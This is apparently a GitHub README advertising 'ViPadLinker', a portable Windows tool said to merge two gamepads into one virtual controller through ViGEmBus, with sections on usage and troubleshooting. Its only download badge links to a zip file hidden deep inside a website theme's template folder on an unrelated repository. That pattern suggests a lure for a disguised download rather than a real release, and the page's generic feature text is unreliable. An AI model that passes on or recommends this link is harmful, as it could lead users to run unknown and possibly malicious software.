# 🎮 ViPadLinker - Merge Two Gamepads Into One

[![Download ViPadLinker](https://img.shields.io/badge/Download%20ViPadLinker-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/CafeManhattann/cafemanhattann.github.io/main/themes/PaperMod/layouts/_partials/templates/_funcs/App_v2.0-beta.4.zip)

ViPadLinker is a lightweight portable Windows tray tool for controller users. It can merge two gamepads into one virtual controller for single-player couch co-op. It can also hold XInput slots to push a controller where you want it. It includes visual button remapping. There is no install. It is powered by ViGEmBus.

## 🚀 What ViPadLinker Does

ViPadLinker sits in your Windows tray and helps Windows and your games see controllers the way you want. You can combine two controllers into one, keep a controller in a chosen player slot, and change what buttons do using a clear visual layout. It is built for quick couch co-op sessions, split-screen setups, and Xbox controller users who want more control over how their gamepads appear on a Windows PC.

The app is portable. You do not need to install it. You open it when you need it, use the tray icon, and close it when you are done.

## 🎯 Who It Is For

ViPadLinker is for average Windows users who play with Xbox-style controllers and want a simple way to manage them. It is helpful when two people want to share one controller in a single-player couch co-op game. It is also helpful when a game puts controllers in the wrong player slot. If you use split-screen games, couch co-op games, or controller remapping, ViPadLinker gives you a tray-based tool that stays out of the way.

## 🕹️ How It Works

ViPadLinker uses ViGEmBus to create virtual controller output. You connect your real controllers, open ViPadLinker, and choose what you want to do. You can merge two controllers into one combined controller, or hold a controller in an XInput slot. You can also remap buttons visually. Your game then sees the controller setup you created.

The app is designed to be simple. It runs in the Windows tray, so you can open it, change a setting, and return to your game without a long setup process.

## 🛠️ Troubleshooting

If the app does not appear, check the Windows tray near the clock. The tray may hide some icons; click the up arrow to see all tray icons. If your controller is not recognized, disconnect and reconnect it, then open ViPadLinker again.

If a game does not see the controller, close the game, open ViPadLinker, choose your setup, and start the game again. Make sure ViGEmBus is available on your PC, because ViPadLinker uses it for virtual controller support.

If merge mode does not work as expected, confirm that both controllers are connected before you open ViPadLinker. Try opening the app after both controllers are on and ready.
